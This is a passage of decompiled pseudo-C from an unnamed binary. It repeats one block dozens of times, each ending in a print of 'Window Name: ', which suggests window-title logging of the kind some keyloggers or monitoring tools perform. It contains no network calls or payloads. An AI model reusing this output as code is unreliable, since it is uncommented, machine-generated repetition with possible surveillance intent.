uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    